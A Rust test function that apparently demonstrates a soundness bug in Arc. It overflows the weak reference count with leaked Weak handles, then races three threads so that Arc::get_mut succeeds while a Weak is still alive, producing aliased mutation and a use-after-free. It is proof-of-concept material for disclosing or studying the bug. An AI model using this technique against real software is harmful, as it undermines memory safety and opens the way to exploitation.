type Counter = u32;

#[test]
fn exploit() {
    println!("Started!");
    use std::boxed::Box;
    use std::sync::*;
    // use crate::sync::atomic::{AtomicBool, Ordering};

    let arc = Arc::new(Box::new(7));

    // Keep one of the weaks alive
    let weak = Arc::downgrade(&arc);

    // The weak count starts at `1`.
    // Increase to `Counter::MAX - 1`.
    for i in 0..Counter::MAX - 3 {
        std::mem::forget(Arc::downgrade(&arc));
        if i % 100000000 == 0 {
            println!("{i} out of {}", Counter::MAX);
        }
    }

    let mutex_arc = std::sync::Mutex::new(Some(arc));

    println!("Finished incrementing");

    // let start = AtomicBool::new(false);

    // We run this function three times in parallel, to trigger our vulnerability.
    let evil = || {
        let id = std::thread::current().id();

        // You can try this if some extra syncronization is wanted, to make all three threads
        // start at the approximately same time. I didn't end up needing it, so I don't know if it even helps.
        // loop {
        //     if start.load(Ordering::Relaxed) {
        //         break;
        //     }
        // }
        let weak2 = weak.clone();
        println!("{id:?}: Managed to clone!");
        // Take the `Arc`
        let arc = mutex_arc.lock().unwrap().take();
        let Some(mut arc) = arc else {
            println!("{id:?}: Error: Arc already taken!");
            return;
        };
        println!("{id:?}: Arc taken!");
        // This will succeed even though we still have a `Weak`
        let Some(val) = Arc::get_mut(&mut arc) else {
            println!("{id:?}: Error: Failed to get unique access :(");
            return; // Didn't manage to exploit :(
        };
        println!("{id:?}: Succeeded!");

        let arc2 = weak2.upgrade().unwrap();
        let also_val = &**arc2;
        // `val` and `also_val` point to the same value.
        println!("{id:?}: also_val: {also_val}");
        **val = 9;
        println!("{id:?}: also_val: {also_val}");
        *val = Box::new(5);
        // Now `also_val` points to freed memory
        println!("{id:?}: also_val: {also_val}");
    };

    std::thread::scope(|s| {
        let _ = s.spawn(evil);
        let _ = s.spawn(evil);
        let _ = s.spawn(evil);
        // let _ = s.spawn(|| {
        //     start.store(true, Ordering::Relaxed);
        // });
    });

    println!("Done.\n\n\n");
}
